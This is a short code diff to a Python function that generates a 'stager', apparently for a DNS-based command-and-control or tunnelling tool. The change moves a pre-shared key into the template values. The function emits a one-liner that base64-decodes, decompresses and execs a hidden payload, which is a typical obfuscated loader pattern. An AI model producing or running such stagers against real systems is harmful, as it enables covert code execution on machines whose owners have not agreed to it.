@@ -33,6 +33,7 @@ def generate_stager(config, template, client_publish_item, target_os):
         "SLICE_TOKEN_LEN": int(client_publish_item["slice_token_len"]),
         "RESPONSE_LABEL": config.response_label,
         "DNS_EDNS_SIZE": int(config.dns_edns_size),
+        "PSK": config.psk,
     }
 
     source = template
@@ -85,7 +86,7 @@ def generate_stager(config, template, client_publish_item, target_os):
         "python3 -c "
         '"import base64,zlib;'
         "exec(zlib.decompress(base64.b64decode('%s')))\""
-        " --resolver RESOLVER --psk PSK"
+        " --resolver RESOLVER"
         % payload_str
     )
 
